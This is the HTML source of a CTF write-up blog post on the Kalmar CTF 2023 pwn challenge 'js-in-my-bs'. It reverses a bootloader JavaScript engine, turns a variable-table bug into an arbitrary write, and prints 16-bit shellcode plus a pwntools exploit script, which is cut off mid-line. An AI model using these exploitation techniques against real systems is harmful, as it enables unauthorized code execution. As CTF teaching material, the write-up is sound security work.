@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x0 IntroductionDescription: TDB Files: TBD 0x1 Playing around with their JS engineChallenge runs under a i386 environment using a simulator (qemu) 1.&#x2F;qemu-system-i386 -L &#x2F;bios -display none -drive fo">
+<meta property="og:type" content="website">
+<meta property="og:title" content="[Pwn] js-in-my-bs [Kalmar CTF 2023]">
+<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="0x0 IntroductionDescription: TDB Files: TBD 0x1 Playing around with their JS engineChallenge runs under a i386 environment using a simulator (qemu) 1.&#x2F;qemu-system-i386 -L &#x2F;bios -display none -drive fo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_220531.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_221209.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_222644.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_224254.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_224037.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_224658.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_224909.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_225041.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_225456.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_230553.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_225921.png">
+<meta property="og:image" content="http://www.aynakeya.com/2023-03-05_233622.png">
+<meta property="article:published_time" content="2023-03-05T06:47:00.000Z">
+<meta property="article:modified_time" content="2023-05-03T08:53:58.922Z">
+<meta property="article:author" content="Aynakeya">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.aynakeya.com/2023-03-05_220531.png">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html","path":"ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html","title":"[Pwn] js-in-my-bs [Kalmar CTF 2023]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Pwn] js-in-my-bs [Kalmar CTF 2023] | Aynakeya's Blog
+</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Playing-around-with-their-JS-engine"><span class="nav-number">2.</span> <span class="nav-text">0x1 Playing around with their JS engine</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Preparation"><span class="nav-number">3.</span> <span class="nav-text">0x2 Preparation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Reversing-amp-Analyzing"><span class="nav-number">4.</span> <span class="nav-text">0x3 Reversing &amp; Analyzing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-crafting-shellcode"><span class="nav-number">5.</span> <span class="nav-text">0x4 crafting shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#print-out-flag"><span class="nav-number">5.1.</span> <span class="nav-text">print out flag:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#load-second-sector-into-memory"><span class="nav-number">5.2.</span> <span class="nav-text">load second sector into memory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#final-shellcode"><span class="nav-number">5.3.</span> <span class="nav-text">final shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-Script-Steps"><span class="nav-number">6.</span> <span class="nav-text">0x5 Script Steps</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-Exploit"><span class="nav-number">7.</span> <span class="nav-text">0x6 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x7-flag"><span class="nav-number">8.</span> <span class="nav-text">0x7 flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">9.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner page posts-expand">
+
+
+    
+    
+    
+    <div class="post-block" lang="en"><header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">[Pwn] js-in-my-bs [Kalmar CTF 2023]
+</h1>
+
+<div class="post-meta-container">
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2023/">2023</a></li>
+            <li><a href="/ctf-writeup/2023/kalmar/">KALMAR</a></li>
+            <li><a href="/ctf-writeup/2023/kalmar/pwn/">PWN</a></li>
+          <li>JS-IN-MY-BS</li>
+  </ul>
+</div>
+
+</header>
+
+      
+      
+      <div class="post-body">
+          <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
+<p>Files: TBD</p>
+<h1 id="0x1-Playing-around-with-their-JS-engine"><a href="#0x1-Playing-around-with-their-JS-engine" class="headerlink" title="0x1 Playing around with their JS engine"></a>0x1 Playing around with their JS engine</h1><p>Challenge runs under a i386 environment using a simulator (qemu)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-i386 -L /bios -display none -drive format=raw,file=&quot;./bootjs.bin&quot; -serial stdio</span><br></pre></td></tr></table></figure>
+
+<p>qemu simulator will load boot section in bootjs.bin and spawn a javascript console(?).</p>
+<p>In this javascript console, I was able to executing some basic command such as simple math operation, print(function calling), and variable assignment.</p>
+<p><img data-src="/2023-03-05_220531.png" alt="2023-03-05_220531.png"></p>
+<p>However, I found certain limitation when playing with this simulator</p>
+<ol>
+<li>variable name can only be an one byte character, (eg <code>a</code>,<code>b</code>)</li>
+<li>math operation only support number from 0-9 (also single byte)</li>
+</ol>
+<p>OK, then where is the flag. Lets take look at bootjs.bin</p>
+<h1 id="0x2-Preparation"><a href="#0x2-Preparation" class="headerlink" title="0x2 Preparation"></a>0x2 Preparation</h1><p>Before starting reversing, I first did some research about i386 boot loader. (see reference section)</p>
+<p>boot loader is loaded after bios. and bios will load first sector of  boot loader (<strong>512 bytes</strong>) to a fixed address in memory (0x7c00). </p>
+<p><img data-src="/2023-03-05_221209.png" alt="2023-03-05_221209.png"></p>
+<p>Boot loader is usually written in 16-bit assembly. executing in cpu real mode. </p>
+<p>The main task for boot loader is to load kernel into memory. Then, kernel will deal with everything else after that. (Which is not the case for this challenge, the boot loader for this challenge is a js engine)</p>
+<h1 id="0x3-Reversing-amp-Analyzing"><a href="#0x3-Reversing-amp-Analyzing" class="headerlink" title="0x3 Reversing &amp; Analyzing"></a>0x3 Reversing &amp; Analyzing</h1><p>After loaded <code>bootjs.bin</code> in Binary Ninja. I found the placeholder flag instantaneously. flag bytes start at <code>0x7e00</code> after a MBR boot signature <code>55AA</code>. </p>
+<p>Above flag bytes, there is a huge chunk of suspicious <code>A</code>s. </p>
+<p><img data-src="/2023-03-05_222644.png" alt="2023-03-05_222644.png"></p>
+<p>We know that bios only load first sector of boot loader into memory, flag bytes was clearly not in the memory (0x7e00-0x7c00 &#x3D; 0x200 &#x3D; 512).</p>
+<p>(Therefore, at some point, I have to executing some shellcode so that I could load flag bytes into the memory.)</p>
+<p>After took some time analyzing the binary file, I came up with those  functions</p>
+<p><img data-src="/2023-03-05_224254.png" alt="2023-03-05_224254.png"></p>
+<p><code>print_byte</code>: print one byte as ascii to screen.</p>
+<p><code>print_crlf</code>: print CRLF to screen <code>\r\n</code> </p>
+<p><code>print_hex</code>: print 4 bit as hex.</p>
+<p><img data-src="/2023-03-05_224037.png" alt="2023-03-05_224037.png"></p>
+<p><code>read_input</code>: read one byte from user input and print it back to screen</p>
+<p><img data-src="/2023-03-05_224658.png" alt="2023-03-05_224658.png"></p>
+<p><code>math_op</code>: perform math operation recursively</p>
+<p><img data-src="/2023-03-05_224909.png" alt="2023-03-05_224909.png"></p>
+<p><code>input_to_num</code>: ask one byte from user input. </p>
+<p>If user input is a number then return the number itself (<code>sub al, 0x30</code>). </p>
+<p>Otherwise, it is a variable. So, it will get the value of that variable using <code>var_to_num</code>(actually set si to the data offset) and return the value.</p>
+<p><img data-src="/2023-03-05_225041.png" alt="2023-03-05_225041.png"></p>
+<p><code>entry</code>: main loop</p>
+<p>if second byte is <code>=</code>, it will perform variable assignment <code>mov word ptr [si], bx</code>. </p>
+<p>If second byte is a <code>(</code>, it will regard first byte as a fucntion name. and call this function. <code>call word ptr [si]</code></p>
+<p><img data-src="/2023-03-05_225456.png" alt="2023-03-05_225456.png"></p>
+<p><code>log_print</code>: print two bytes as hex</p>
+<p><img data-src="/2023-03-05_230553.png" alt="2023-03-05_230553.png"></p>
+<p><strong>Finally</strong>, the vulnerable funtion <code>var_to_num</code></p>
+<p>This function uses the suspicious chunk start from <code>0x7cda</code> as a <strong>variable table</strong></p>
+<p>This <strong>variable table</strong> store all existing variable name and value (or function name and address). Each variable entry (or function entry) occupy 3 bytes (1 byte name, 2 byte data).</p>
+<p>For example, the binary came with a built in function <code>l</code> (which print value in a variable as hex). </p>
+<p>So, in the variable table, <code>6c7a7c</code> represents this entry. Where <code>6c</code> is the function name <code>l</code>, <code>7a7c</code> is the function address of <code>log_print</code> in little endian (<code>0x7c7a</code>) </p>
+<p><img data-src="/2023-03-05_225921.png" alt="2023-03-05_225921.png"></p>
+<p>Also, register <code>cx</code> hold how many variables&#x2F;functions are in the variable table.</p>
+<p>Here is the pesudo code for <code>var_to_num</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">func var_to_num(var_name):</span><br><span class="line">    si = variable_table = 0x7cda</span><br><span class="line">    idx = 0</span><br><span class="line">    while idx &lt; cx:</span><br><span class="line">        if var_name is the first byte in variable table:</span><br><span class="line">            si = si +1 // move si to data section</span><br><span class="line">            return</span><br><span class="line">        si = si +3 // move to next entry</span><br><span class="line">        idx ++</span><br><span class="line">    // if variable name not found in variable table</span><br><span class="line">    cx = cx + 1 // increase variable count</span><br><span class="line">    si[0] = var_name // set first byte to variable name</span><br><span class="line">    si = si + 1 // move si to data section</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>
+
+<p>Here we go, I got a limited arbitrary write in an executable region!</p>
+<p>limitation: first bytes of every three bytes in shellcodes must be different</p>
+<p>Now I can write shellcode in this region and run the shellcode by calling a custom function.</p>
+<h1 id="0x4-crafting-shellcode"><a href="#0x4-crafting-shellcode" class="headerlink" title="0x4 crafting shellcode"></a>0x4 crafting shellcode</h1><p>Our shellcode need to do two thing: load second sector from drive into the memory; and print out the flag</p>
+<h2 id="print-out-flag"><a href="#print-out-flag" class="headerlink" title="print out flag:"></a>print out flag:</h2><ol>
+<li>setting up register</li>
+<li>using <code>lodsb</code> to load one byte to <code>al</code> and move <code>si</code> to next byte</li>
+<li>print out <code>al</code> using <code>out dx,al</code></li>
+<li>jump to step 2 again using <code>jmp</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop</span><br></pre></td></tr></table></figure>
+
+<h2 id="load-second-sector-into-memory"><a href="#load-second-sector-into-memory" class="headerlink" title="load second sector into memory"></a>load second sector into memory</h2><p>This part is bit tricky, but I found a very good post about how to load second sector <a target="_blank" rel="noopener" href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a>. </p>
+<p>So I just copy paste their assembly code and did some modification.</p>
+<p>something to be noted</p>
+<p><code>int 0x13</code> uses cylinder-head-sector (CHS) addressing. In CHS addressing, sector index start with <strong>1</strong> instead of <strong>0</strong> due to some historical reason.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov ah, 0x2                ; read sectors from drive</span><br><span class="line">nop</span><br><span class="line">mov al, 1                  ; sectors to read</span><br><span class="line">nop</span><br><span class="line">mov ch, 0                  ; cylinder idx</span><br><span class="line">nop</span><br><span class="line">mov dh, 0                  ; head idx</span><br><span class="line">nop</span><br><span class="line">mov cl, 2                  ; sector idx</span><br><span class="line">nop</span><br><span class="line">mov dl, 0x80               ; disk idx</span><br><span class="line">nop</span><br><span class="line">mov bx, 0x7e00             ; target pointer</span><br><span class="line">int 0x13                   ; interrupt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="final-shellcode"><a href="#final-shellcode" class="headerlink" title="final shellcode"></a>final shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ah, 0x2                ; read sectors from drive</span><br><span class="line">    nop</span><br><span class="line">    mov al, 1                  ; sectors to read</span><br><span class="line">    nop</span><br><span class="line">    mov ch, 0                  ; cylinder idx</span><br><span class="line">    nop</span><br><span class="line">    mov dh, 0                  ; head idx</span><br><span class="line">    nop</span><br><span class="line">    mov cl, 2                  ; sector idx</span><br><span class="line">    nop</span><br><span class="line">    mov dl, 0x80               ; disk idx</span><br><span class="line">    nop</span><br><span class="line">    mov bx, 0x7e00             ; target pointer</span><br><span class="line">    int 0x13                   ; interrupt</span><br><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop                        ; padding</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>credit to my teammate @jason</p>
+</blockquote>
+<p>compile it with</p>
+<p><code>nasm shellcode.asm -o shellcode.o</code></p>
+<p>yep! all the first bytes are different!!!!!</p>
+<p><img data-src="/2023-03-05_233622.png" alt="2023-03-05_233622.png"></p>
+<h1 id="0x5-Script-Steps"><a href="#0x5-Script-Steps" class="headerlink" title="0x5 Script Steps"></a>0x5 Script Steps</h1><ol>
+<li>write function which point to shell code</li>
+<li>write shellcode</li>
+<li>call shellcode</li>
+<li>retrieve flag</li>
+</ol>
+<h1 id="0x6-Exploit"><a href="#0x6-Exploit" class="headerlink" title="0x6 Exploit"></a>0x6 Exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([<span class="string">&quot;qemu-system-i386&quot;</span>, </span><br><span class="line">            <span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./bios&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-display&quot;</span>,<span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-drive&quot;</span>,<span class="string">&quot;format=raw,file=bootjs.bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-serial&quot;</span>,<span class="string">&quot;stdio&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;54.93.211.13&quot;</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.LOCAL:</span><br><span class="line">    hash_challenge = io.recvline().split()</span><br><span class="line">    lp(<span class="string">&quot;proof of work:&quot;</span>, hash_challenge)</span><br><span class="line">    <span class="keyword">if</span> hash_challenge[<span class="number">0</span>] == <span class="string">b&#x27;hashcash&#x27;</span> <span class="keyword">and</span> hash_challenge[<span class="number">1</span>] == <span class="string">b&#x27;-mb28&#x27;</span>:</span><br><span class="line">        response = subprocess.run([</span><br><span class="line">            <span class="string">&#x27;hashcash&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-mb28&#x27;</span>,</span><br><span class="line">            hash_challenge[<span class="number">2</span>].decode(),</span><br><span class="line">        ], capture_output=<span class="literal">True</span>).stdout</span><br><span class="line">        io.send(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_js</span>(<span class="params">value</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt; &quot;</span>,value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_rs</span>(<span class="params">is_log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> is_log:</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b40290b00190b50090b60090b10290b28090bb007ecd13baf80389deaceeebfc90&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_mem</span>(<span class="params">val,value</span>):</span><br><span class="line">    <span class="comment"># dec_value = int.from_bytes(value,&quot;little&quot;)</span></span><br><span class="line">    payload = val+<span class="string">b&#x27;=&#x27;</span>+(<span class="built_in">str</span>(value % <span class="number">9</span>)+<span class="string">&quot;+9&quot;</span>*(value // <span class="number">9</span>)+<span class="string">&quot;\n&quot;</span>).encode()</span><br><span class="line">    <span class="comment"># lp(payload)</span></span><br><span class="line">    send_js(payload)</span><br><span class="line">    <span class="comment"># lp(io.recvuntil(b&quot;\r\n&quot;))</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">write_to_mem(<span class="string">b&quot;a&quot;</span>,<span class="number">0x7c7a</span>)</span><br><span class="line">write_to_mem(<span class="string">b&#x27;b&#x27;</span>,<span class="number">0x7ce3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">3</span>):</span><br><span class="line">    part =  shellcode[i:i+<span class="number">3</span>]</span><br><span class="line">    lp(<span class="string">&quot;sending&quot;</span>,i,part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span 